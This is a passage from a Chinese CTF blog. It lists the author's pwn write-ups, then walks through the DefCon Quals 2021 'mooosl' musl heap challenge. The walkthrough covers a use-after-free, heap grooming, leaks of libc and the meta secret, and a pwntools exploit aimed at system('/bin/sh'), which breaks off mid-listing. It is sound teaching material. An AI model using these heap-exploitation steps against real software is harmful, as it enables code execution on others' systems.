<h1 id="1-glibc分析系列"><a href="#1-glibc分析系列" class="headerlink" title="1. glibc分析系列"></a>1. glibc分析系列</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_54218833/article/details/122868272">how2heap深入学习(1)</a>：glibc 2.23版本fastbin_dup、fastbin_dup_consolidate、fastbin_into_stack、house_of_einherjar、house_of_force、house_of_lore，部分_int_free函数检查（2.23版本）<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_54218833/article/details/122897689">how2heap深入学习(2)</a>：glibc 2.23版本house_of_mind_fastbin、house_of_orange<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_54218833/article/details/123306684">how2heap深入学习(3)</a>：glibc 2.23版本house_of_roman、house_of_spirit、house_of_storm<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_54218833/article/details/123395646">how2heap深入学习(4)</a>：glibc 2.23版本large_bin_attack、mmap_overlapping_chunks、overlapping_chunks、overlapping_chunks_2、poison_null_byte<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_54218833/article/details/123407435">how2heap深入学习(5)</a>：glibc 2.23版本unsafe_unlink、unsorted_bin_attack、unsorted_bin_into_stack<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_54218833/article/details/123444930">how2heap深入学习(6)</a>：glibc 2.27版本fastbin_dup、fastbin_reverse_into_tcache、house_of_botcake、house_of_einherjar、house_of_force、house_of_lore<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_54218833/article/details/123588647">how2heap深入学习(7)</a>：glibc 2.27版本house_of_mind_fastbin、house_of_storm，large_bin的链入过程<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_54218833/article/details/123630186">how2heap深入学习(8)</a>：glibc 2.27版本large_bin_attack、mmap_overlapping_chunks、overlapping_chunks、poison_null_byte、tcache_house_of_spirit、tcache_poisoning、tcache_stashing_unlink_attack、unsafe_unlink，切割large_bin返回chunk的过程<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_54218833/article/details/124239224">how2heap深入学习(9)</a>：glibc 2.31版本_int_malloc、_int_free函数堆块检查<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_54218833/article/details/126401517">house of emma演示程序</a>：高版本glibc利用方式house of emma演示过程详细分析<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_54218833/article/details/128484409">house of kiwi演示程序</a>：高版本glibc利用方式house of kiwi演示过程详细分析<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_54218833/article/details/128575508">house of pig原题分析与演示程序</a>：glibc 2.31版本house of pig演示过程及原题详细分析<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_54218833/article/details/128624427">house of apple v1演示程序</a>：glibc 2.35版本house of apple v1演示过程详细分析</p>
<h1 id="2-Kernel-pwn系列"><a href="#2-Kernel-pwn系列" class="headerlink" title="2. Kernel pwn系列"></a>2. Kernel pwn系列</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_54218833/article/details/124360103">Kernel pwn 入门 (1)</a>：搭建kernel环境需要注意的问题、强网杯2018-core <strong>ROP</strong>法题解分析<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_54218833/article/details/124411025">Kernel pwn 入门 (2)</a>：CISCN2017-babydriver <strong>ret2usr</strong>法题解分析（低版本内核SMAP&#x2F;SMEP的绕过）<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_54218833/article/details/125647404">Kernel pwn 入门 (3)</a>：LCTF2022-kgadget <strong>ret2dir</strong>法题解分析<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_54218833/article/details/124521291">Kernel pwn 入门 (4)</a>：CISCN2017-babydriver另解，伙伴系统简介，InCTF-kqueue <strong>内核堆溢出</strong>法题解分析<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_54218833/article/details/125875027">Kernel pwn 入门 (5)</a>：0CTF2018-baby <strong>条件竞争（double fetch）</strong> 题解分析<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_54218833/article/details/126004590">Kernel pwn 入门 (6)</a>：强网杯2021-notebook <strong>userfaultfd</strong>法题解分析<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_54218833/article/details/126571321">Kernel pwn 入门 (7)</a>：D^3CTF2019-knote <strong>modprobe_path</strong>学习与题解分析<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_54218833/article/details/127218102">Kernel pwn 入门 (8)</a>：Linux内核内存分配机制简述（伙伴系统、slab、slub）</p>
<h1 id="3-llvm-pass-pwn系列"><a href="#3-llvm-pass-pwn系列" class="headerlink" title="3. llvm pass pwn系列"></a>3. llvm pass pwn系列</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_54218833/article/details/125685242">LLVM pass pwn 入门 (1)</a>：llvm pass基础知识<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_54218833/article/details/125699994">LLVM pass pwn 入门 (2)</a>：CISCN-2021 satool 题解分析，llvm pass类题目调试方法<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_54218833/article/details/125853210">LLVM pass pwn 入门 (3)</a>：红帽杯2021-simpleVM 题解分析<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_54218833/article/details/125879635">LLVM pass pwn 入门 (4)</a>：CISCN-2022 satool 题解分析<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_54218833/article/details/126081315">LLVM pass pwn 实战</a>：强网杯2022 yakagame 题解分析</p>
<h1 id="4-buuoj-刷题记录"><a href="#4-buuoj-刷题记录" class="headerlink" title="4. buuoj 刷题记录"></a>4. buuoj 刷题记录</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_54218833/article/details/124530348">buuctf-pwn write-ups (1)</a>：1<del>16题<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_54218833/article/details/124533708">buuctf-pwn write-ups (2)</a>：17</del>26题，其中第26题是堆题<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_54218833/article/details/124639635">buuctf-pwn write-ups (3)</a>：27<del>31题<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_54218833/article/details/124834530">buuctf-pwn write-ups (4)</a>：32</del>38题，其中第38题沙箱初探<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_54218833/article/details/125251517">buuctf-pwn write-ups (5)</a>：39<del>46题<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_54218833/article/details/125385767">buuctf-pwn write-ups (6)</a>：47</del>53题，其中第53题是C++ pwn<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_54218833/article/details/125458227">buuctf-pwn write-ups (7)</a>：54<del>61题，其中第60题考linux命令<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_54218833/article/details/125567534">buuctf-pwn write-ups (8)</a>：62</del>66题<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_54218833/article/details/125600497">buuctf-pwn write-ups (9)</a>：67~72题</p>
<h1 id="5-ARM-pwn-系列"><a href="#5-ARM-pwn-系列" class="headerlink" title="5. ARM pwn 系列"></a>5. ARM pwn 系列</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_54218833/article/details/127658611">ARM pwn 入门 (1)</a>：ARM基础知识<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_54218833/article/details/127658611">ARM pwn 入门 (2)</a>：第一道ARM pwn——buuoj 第139题 jarvisoj_typo<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_54218833/article/details/127716198">ARM pwn 入门 (3)</a>：ROP Emporium ARM版本1-2题<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_54218833/article/details/127723312">ARM pwn 入门 (4)</a>：ROP Emporium ARM版本3-5题</p>
<h1 id="6-musl-pwn系列"><a href="#6-musl-pwn系列" class="headerlink" title="6. musl pwn系列"></a>6. musl pwn系列</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_54218833/article/details/127316863">musl pwn 入门 (1)</a>：musl内存分配关键数据结构与函数介绍<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_54218833/article/details/128692531">musl pwn 入门 (2)</a>：musl libc内存分配free函数的unlink利用方式与演示程序<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_54218833/article/details/128728282">musl pwn 入门 (3)</a>：musl libc的FSOP原理介绍与演示程序<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_54218833/article/details/128797680">musl pwn 入门 (4)</a>：musl libc例题分析：DefCon Quals 2021 mooosl <strong>&lt;最新&gt;</strong></p>
<h1 id="7-杂项"><a href="#7-杂项" class="headerlink" title="7. 杂项"></a>7. 杂项</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_54218833/article/details/124061198">ROP Emporium 1-6题</a>：x86_64架构<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_54218833/article/details/124069737">ROP Emporium 7-8题</a>：x86_64架构</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/musl-pwn-%E5%85%A5%E9%97%A8-4/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's Pwnhome">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/musl-pwn-%E5%85%A5%E9%97%A8-4/" class="post-title-link" itemprop="url">musl pwn 入门 (4)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-02-28 22:27:38 / Modified: 22:54:19" itemprop="dateCreated datePublished" datetime="2023-02-28T22:27:38+08:00">2023-02-28</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/musl-pwn-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">musl pwn 系列</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>在前面的介绍中，我们学习了musl pwn的基本原理，下面我们就通过一道经典例题进一步巩固。</p>
<p>这是DefCon Quals 2021中的一道题mooosl，直接在github上搜这道题的名字就可以找到作者发布的附件，内含说明、作者的exp、源码以及二进制程序。</p>
<p>注：我本来以为题目给的musl 1.2.2的libc和自己机子上面的一样，结果发现差得太远了，白花了我大半天时间。😭</p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/241104#h2-3">参考文章</a></p>
<h1 id="1-逆向分析"><a class="markdownIt-Anchor" href="#1-逆向分析"></a> 1. 逆向分析</h1>
<p>这是一个菜单题，包含三种操作store、query和delete，经过逆向分析之后可以知道这个菜单题的数据结构逻辑。<strong>程序中有一段0x8000大小的空间hashmap，可以保存0x1000个指针。这个指针是作者定义的结构体，结构体中包含有两个字符串，分别为key和value。进行store操作时，首先输入key，然后程序使用一个函数计算其哈希值（0-0xFFF），这个哈希值就是这个结构体需要保存到hashmap中的索引。如果有两个key的哈希值相同，则第二次store获取的结构体就会成为hashmap中的链首，结构体中还有一个指针用于形成链表，第一次store的结构体的地址就保存在第二次store的结构体之中。query则是根据输入的key值计算出哈希值对应的结构体并输出。delete会将找到的结构体移出hashmap。</strong></p>
<p>本题的漏洞在delete函数中：</p>
<p><img src="https://img-blog.csdnimg.cn/cbb4c310bd414edcb3f3ea06674157fc.png" alt="结构体的声明" /></p>
<p><img src="https://img-blog.csdnimg.cn/f43608de7cf84425b053c5562b3a9abd.png" alt="" /></p>
<p>注意delete中的if语句，这个if语句内部的功能是从hashmap中移出结构体实例，p_chain就是hashmap中的地址。但这里有一种情况没有考虑：当要删除的结构体位于链尾时，if语句的两个条件都不会满足，这样这个结构体就不会从链表中删除，而是留在其中。这就为我们UAF创造了条件。如果我们能够通过堆排布操作让另一个结构体的value地址等于这个已经被删除的结构体地址，那么通过query我们就能够获取到这个结构体中的内容，其中包含多个指针的地址。</p>
<h1 id="2-解题第一步泄露信息"><a class="markdownIt-Anchor" href="#2-解题第一步泄露信息"></a> 2. 解题第一步——泄露信息</h1>
<p>我们再来回顾一下<code>free</code>函数的流程：<code>free</code>的重点在于<code>nontrivial_free</code>，注意下面的代码片段：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// (free函数的一个片段)</span></span><br><span class="line">	wrlock();</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mapinfo</span> <span class="title">mi</span> =</span> nontrivial_free(g, idx);</span><br><span class="line">	unlock();</span><br><span class="line">	<span class="keyword">if</span> (mi.len) &#123;</span><br><span class="line">		<span class="type">int</span> e = errno;</span><br><span class="line">		munmap(mi.base, mi.len);</span><br><span class="line">		errno = e;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// (nontrivial_free函数的一个片段)</span></span><br><span class="line">	<span class="keyword">if</span> (mask+self == (<span class="number">2u</span>&lt;&lt;g-&gt;last_idx)<span class="number">-1</span> &amp;&amp; okay_to_free(g)) &#123;</span><br><span class="line">		<span class="comment">// any multi-slot group is necessarily on an active list</span></span><br><span class="line">		<span class="comment">// here, but single-slot groups might or might not be.</span></span><br><span class="line">		<span class="keyword">if</span> (g-&gt;next) &#123;</span><br><span class="line">			assert(sc &lt; <span class="number">48</span>);</span><br><span class="line">			<span class="type">int</span> activate_new = (ctx.active[sc]==g);</span><br><span class="line">			dequeue(&amp;ctx.active[sc], g);</span><br><span class="line">			<span class="keyword">if</span> (activate_new &amp;&amp; ctx.active[sc])</span><br><span class="line">				activate_group(ctx.active[sc]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> free_group(g);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// (free_group中的一个片段)</span></span><br><span class="line">	<span class="keyword">if</span> (g-&gt;maplen) &#123;</span><br><span class="line">		step_seq();</span><br><span class="line">		record_seq(sc);</span><br><span class="line">		mi.base = g-&gt;mem;</span><br><span class="line">		mi.len = g-&gt;maplen*<span class="number">4096UL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	...</span><br><span class="line">	free_meta(g);</span><br><span class="line">	<span class="keyword">return</span> mi;</span><br></pre></td></tr></table></figure>
<p>当一个group中所有的chunk均被释放时，在释放最后一个chunk时会调用到<code>free_group</code>函数将group释放，这是我们不希望看到的，因此在堆排布的过程中，我们不应该让一个meta中的所有chunk在某一时刻全部被释放。</p>
<p>另外注意到，<code>malloc</code>函数在选择chunk时不会去选择刚刚被<code>free</code>的chunk，因为此时代表该chunk的bit只在<code>freed_mask</code>中为1，在<code>avail_mask</code>中为0。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">uint32_t</span> <span class="title function_">activate_group</span><span class="params">(<span class="keyword">struct</span> meta *m)</span></span><br><span class="line">&#123;</span><br><span class="line">	assert(!m-&gt;avail_mask);</span><br><span class="line">	<span class="type">uint32_t</span> mask, act = (<span class="number">2u</span>&lt;&lt;m-&gt;mem-&gt;active_idx)<span class="number">-1</span>;</span><br><span class="line">	<span class="keyword">do</span> mask = m-&gt;freed_mask;</span><br><span class="line">	<span class="keyword">while</span> (a_cas(&amp;m-&gt;freed_mask, mask, mask&amp;~act)!=mask);</span><br><span class="line">	<span class="keyword">return</span> m-&gt;avail_mask = mask &amp; act;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而<code>activate_group</code>函数则可以将<code>free_mask</code>中的所有chunk变为<code>avail_mask</code>。这个函数触发的条件是：<strong>这个group的<code>avail_mask</code>为0，该group中不是被free的chunk就是正在使用的chunk</strong>。因此，想要分配到已经被free的结构体所在的chunk，就应该首先让这个group中的chunk全部被分配一次。</p>
<p>考虑到本题使用的是<code>calloc</code>而不是<code>malloc</code>，因此堆排布的目标应该是让一个结构体的value指向另一个结构体，而且不能分配到原来结构体所在的chunk。可行的方法是：</p>
<ul>
<li>Step 1: 分配第1个storage结构体</li>
<li>Step 2: 进行堆空间排布</li>
<li>Step 3: 分配第2个storage结构体使得storage结构体本身位于其value的后面</li>
<li>Step 4: delete第2个storage</li>
<li>Step 5: 分配第3个storage结构体使得这个结构体的chunk就是第2个storage的value</li>
<li>Step 6: 对第2个storage调用query以获得第3个storage结构体中的指针等</li>
</ul>
<p>这里需要进行计算，让两个不同的key值具有相同的哈希值，这个不难实现，因为最终结果是12比特，穷举即可。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">                                                    <span class="comment"># 6543210</span></span><br><span class="line">store(<span class="string">b&#x27;A&#x27;</span>, <span class="string">b&#x27;9889&#x27;</span>)                                <span class="comment"># AAAAAAU</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)                              <span class="comment"># AFFFFFU</span></span><br><span class="line">store(<span class="string">b&#x27;B&#x27;</span>, <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)                            <span class="comment"># UAAAAUU</span></span><br><span class="line">store(find_collision(<span class="string">b&#x27;B&#x27;</span>), <span class="string">b&#x27;B&#x27;</span>)                   <span class="comment"># UAAAUUU</span></span><br><span class="line">delete(<span class="string">b&#x27;B&#x27;</span>)                                        <span class="comment"># FAAAUFU</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)                              <span class="comment"># FFFFUFU -&gt; AAAAUAU</span></span><br><span class="line">store(<span class="string">b&#x27;C&#x27;</span>, <span class="string">b&#x27;C&#x27;</span> * <span class="number">0x1000</span>)                          <span class="comment"># AAAUUUU</span></span><br><span class="line">query(<span class="string">b&#x27;B&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>如上面的代码片段所示，即可通过query操作打印出最后一个store创建的结构体的信息。最后一个store的value地址就在当前的group中，根据这个值可以获取该group的地址。注意这里的最后一次store分配了一个大空间，这会让musl在libc地址正下方mmap一块空间，这样我们可以通过这个地址获取到libc的基地址。在此之后，我们只需要重复地通过query操作修改第二次store获得的storage中的value地址，即可实现任意地址读。因为此时我们可以根据获取的两个地址推导出第二个storage中的关键字段的值。在第一次leak之后，7个chunk索引从高到低的状态应该依次为：AAAAUUU（A可用，U正用，F释放），其中第7个是第二个storage结构体保存的位置，那么我们可以先用3个无效的query让状态变为AFFFUUU，然后就可以使用query操作来修改第二个storage结构体的值，最后再一次query进行任意写。</p>
<p>由此，我们可以获取到<code>meta_area</code>的<code>secret</code>值，libc的基地址等关键信息，之后就要开始使用unlink进行利用了。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">leak = hex2bytes(io.recvline().split(<span class="string">b&quot;:&quot;</span>)[<span class="number">1</span>])</span><br><span class="line">group_addr = u64(leak[<span class="number">0</span>:<span class="number">8</span>]) - <span class="number">0x70</span></span><br><span class="line">smallchunk = group_addr + <span class="number">0x30</span></span><br><span class="line">mmap_addr = u64(leak[<span class="number">8</span>:<span class="number">16</span>]) - <span class="number">0x20</span></span><br><span class="line">enc = u64(leak[<span class="number">32</span>:<span class="number">40</span>]) - <span class="number">1</span></span><br><span class="line">libc_base = mmap_addr + <span class="number">0x4000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;B&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">query(p64(smallchunk) + p64(group_addr) + p64(<span class="number">1</span>) + p64(<span class="number">0x30</span>) + p64(enc) + p64(<span class="number">0</span>), key_size=<span class="number">0x30</span>)</span><br><span class="line">query(<span class="string">b&#x27;B&#x27;</span>)</span><br><span class="line"></span><br><span class="line">leak = hex2bytes(io.recvline().split(<span class="string">b&quot;:&quot;</span>)[<span class="number">1</span>])</span><br><span class="line">meta_addr = u64(leak[<span class="number">0</span>:<span class="number">8</span>])</span><br><span class="line">meta_area = meta_addr &amp; <span class="number">0xFFFF_FFFF_FFFF_F000</span></span><br><span class="line">info(<span class="string">&#x27;meta_area: &#x27;</span> + <span class="built_in">hex</span>(meta_area))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;B&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">query(p64(smallchunk) + p64(meta_area) + p64(<span class="number">1</span>) + p64(<span class="number">0x30</span>) + p64(enc) + p64(<span class="number">0</span>), key_size=<span class="number">0x30</span>)</span><br><span class="line">query(<span class="string">b&#x27;B&#x27;</span>)</span><br><span class="line"></span><br><span class="line">leak = hex2bytes(io.recvline().split(<span class="string">b&quot;:&quot;</span>)[<span class="number">1</span>])</span><br><span class="line">secret = u64(leak[<span class="number">0</span>:<span class="number">8</span>])</span><br><span class="line">info(<span class="string">&#x27;secret: &#x27;</span> + <span class="built_in">hex</span>(secret))</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">stderr = libc_base + libc.symbols[<span class="string">&#x27;stderr&#x27;</span>]</span><br><span class="line">stdout = libc_base + libc.symbols[<span class="string">&#x27;stdout&#x27;</span>]</span><br></pre></td></tr></table></figure>
<h1 id="3-解题第二步伪造file-meta-group等结构并利用"><a class="markdownIt-Anchor" href="#3-解题第二步伪造file-meta-group等结构并利用"></a> 3. 解题第二步：伪造<code>FILE</code>、<code>meta</code>、<code>group</code>等结构并利用</h1>
<p>这一步是常规步骤，我们将伪造的<code>FILE</code>结构体、伪造的<code>meta</code>、<code>group</code>、<code>chunk</code>放在一个chunk中，注意<code>meta_area</code>需要页对齐，并在页首部写入<code>secret</code>值。</p>
<p>写入之后，我们想办法释放假的chunk，方法是将原来用于leak的chunk分配出去，然后修改内部指针的值，再通过delete删除即可。然后就可以利用unlink修改stderr指针的值为我们的假chunk。但是很不幸的是，stderr指针所在的段是只读的，我不知道为什么很多的文章都说要修改这个地方，但是这里不能改，如果能改的话是肯定可以过的。也就是最后一次delete无法完成。</p>
<p>exp:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = process(<span class="string">&#x27;./mooosl&#x27;</span>, env=&#123;<span class="string">&#x27;LD_PRELOAD&#x27;</span>: <span class="string">&#x27;libc.so&#x27;</span>&#125;)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./mooosl&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">att = <span class="keyword">lambda</span>: gdb.attach(io)</span><br><span class="line">sleep = <span class="keyword">lambda</span>: time.sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span 